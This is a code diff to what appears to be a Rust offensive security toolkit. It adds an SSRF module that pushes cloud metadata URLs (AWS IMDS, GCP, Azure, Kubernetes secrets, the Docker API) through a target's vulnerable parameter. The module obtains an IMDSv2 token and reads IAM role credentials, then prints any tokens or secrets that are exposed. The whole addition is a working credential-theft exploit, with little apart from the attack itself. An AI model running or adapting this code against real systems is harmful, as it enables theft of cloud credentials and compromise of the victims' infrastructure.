@@ -257,3 +257,146 @@ pub async fn scan(
     println!("\n{} Port scan complete.", "[*]".cyan().bold());
     Ok(())
 }
+
+const IMDSV2_BYPASS_URLS: &[(&str, &str)] = &[
+    ("AWS IMDSv2 token endpoint", "http://169.254.169.254/latest/api/token"),
+    ("AWS IMDSv2 metadata (with token)", "http://169.254.169.254/latest/meta-data/"),
+    ("AWS IPv6 IMDS", "http://[fd00:ec2::254]/latest/meta-data/"),
+    ("AWS IPv6 token", "http://[fd00:ec2::254]/latest/api/token"),
+    ("AWS user-data", "http://169.254.169.254/latest/user-data/"),
+    ("AWS IAM creds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
+    ("AWS identity doc", "http://169.254.169.254/latest/dynamic/instance-identity/document"),
+    ("GCP project ID", "http://metadata.google.internal/computeMetadata/v1/project/project-id"),
+    ("GCP SA token", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
+    ("GCP SSH keys", "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"),
+    ("GCP user-data", "http://metadata.google.internal/computeMetadata/v1/instance/attributes/user-data"),
+    ("Azure instance", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
+    ("Azure token", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"),
+    ("Azure attested", "http://169.254.169.254/metadata/attested/document?api-version=2018-10-01"),
+    ("K8s SA secrets", "https://kubernetes.default.svc/api/v1/namespaces/default/secrets"),
+    ("K8s SA config", "https://kubernetes.default.svc/api/v1/namespaces/default/serviceaccounts/default"),
+    ("Docker socket", "http://localhost:2375/v1.41/containers/json"),
+    ("Docker socket (v2)", "http://localhost:2376/v1.41/info"),
+];
+
+pub async fn cloud_v2(
+    url: &str,
+    param: &str,
+    token: Option<&str>,
+    timeout: u64,
+) -> anyhow::Result<()> {
+    println!("{} SSRF Cloud Metadata v2 (IMDSv2 Bypass)", "[*]".cyan().bold());
+    println!("{}", "=".repeat(60).cyan());
+    println!("{} URL:   {}", "[*]".cyan().bold(), url);
+    println!("{} Param: {}", "[*]".cyan().bold(), param);
+    println!("{} Testing {} metadata endpoints", "[*]".cyan().bold(), IMDSV2_BYPASS_URLS.len());
+    println!("{}", "-".repeat(60).dimmed());
+
+    let client = build_client(timeout, token);
+    let mut extracted = Vec::new();
+
+    for (name, metadata_url) in IMDSV2_BYPASS_URLS {
+        let test_url = if url.contains("{ssrf}") {
+            url.replace("{ssrf}", metadata_url)
+        } else {
+            metadata_url.to_string()
+        };
+
+        let mut req = client.get(&test_url);
+        if name.starts_with("GCP") {
+            req = req.header("Metadata-Flavor", "Google");
+        }
+        if name.starts_with("Azure") {
+            req = req.header("Metadata", "true");
+        }
+        if name.contains("IMDSv2") || name.contains("IPv6") {
+            req = req.header("X-aws-ec2-metadata-token-ttl-seconds", "21600");
+        }
+
+        match req.send().await {
+            Ok(resp) => {
+                let status = resp.status().as_u16();
+                let body = resp.text().await.unwrap_or_default();
+                let interesting = status == 200 && !body.is_empty();
+                let tag = if interesting {
+                    "EXPOSED".red().bold().to_string()
+                } else if status == 403 {
+                    "forbidden".yellow().to_string()
+                } else if status == 404 {
+                    "not found".dimmed().to_string()
+                } else {
+                    format!("status {}", status)
+                };
+                println!(
+                    "  {} {:40} status={} {}",
+                    "*".cyan(),
+                    name,
+                    status,
+                    tag
+                );
+                if interesting {
+                    println!("    {} {}", ">".red().bold(), body.chars().take(200).collect::<String>());
+                    extracted.push((*name, body.chars().take(300).collect::<String>()));
+                }
+            }
+            Err(_) => {
+                println!("  {} {:40} error", "*".red(), name);
+            }
+        }
+    }
+
+    println!("\n{} Attempting IMDSv2 token fetch + metadata access...", "[*]".cyan().bold());
+    let token_url = "http://169.254.169.254/latest/api/token";
+    let test_url = if url.contains("{ssrf}") {
+        url.replace("{ssrf}", token_url)
+    } else {
+        token_url.to_string()
+    };
+    match client
+        .put(&test_url)
+        .header("X-aws-ec2-metadata-token-ttl-seconds", "21600")
+        .send()
+        .await
+    {
+        Ok(resp) if resp.status().as_u16() == 200 => {
+            let imds_token = resp.text().await.unwrap_or_default();
+            println!("  {} IMDSv2 token obtained: {}...", "[!]".red().bold(), &imds_token[..imds_token.len().min(40)]);
+
+            let meta_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
+            let test_meta = if url.contains("{ssrf}") {
+                url.replace("{ssrf}", meta_url)
+            } else {
+                meta_url.to_string()
+            };
+            match client
+                .get(&test_meta)
+                .header("X-aws-ec2-metadata-token", &imds_token)
+                .send()
+                .await
+            {
+                Ok(resp) if resp.status().as_u16() == 200 => {
+                    let body = resp.text().await.unwrap_or_default();
+                    println!("  {} IAM role: {}", "[!]".red().bold(), body.chars().take(200).collect::<String>());
+                    extracted.push(("IAM Role (via IMDSv2)", body));
+                }
+                _ => {
+                    println!("  {} Could not access metadata with token", "[-]".yellow());
+                }
+            }
+        }
+        _ => {
+            println!("  {} IMDSv2 token fetch failed — IMDSv2 may be enforced", "[-]".yellow());
+        }
+    }
+
+    println!(
+        "\n{} {} / {} metadata endpoints exposed",
+        "[*]".cyan().bold(),
+        extracted.len(),
+        IMDSV2_BYPASS_URLS.len()
+    );
+    if !extracted.is_empty() {
+        println!("{} Cloud metadata is accessible — credentials can be stolen!", "[!]".red().bold());
+    }
+    Ok(())
+}
